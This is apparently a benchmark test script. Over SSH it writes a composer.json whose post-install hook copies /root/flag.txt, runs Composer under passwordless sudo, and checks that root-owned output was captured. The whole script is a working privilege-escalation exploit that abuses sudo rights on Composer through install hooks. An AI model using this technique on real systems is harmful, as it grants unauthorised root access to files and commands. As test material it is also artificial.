#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /home/lowpriv/composerflag 2>/dev/null || true
cd /home/lowpriv/composerproj
sudo rm -rf vendor composer.lock 2>/dev/null || true
cat > composer.json <<'\''EOF'\''
{
  "name": "bench/pwn",
  "description": "bench",
  "type": "project",
  "scripts": {
    "post-install-cmd": [
      "bash -c \"cat /root/flag.txt > /home/lowpriv/composerflag\""
    ]
  }
}
EOF
sudo -n /usr/bin/composer install --no-interaction >/dev/null 2>&1
test -r /home/lowpriv/composerflag && cat /home/lowpriv/composerflag
')"
assert_root_output "${out}"
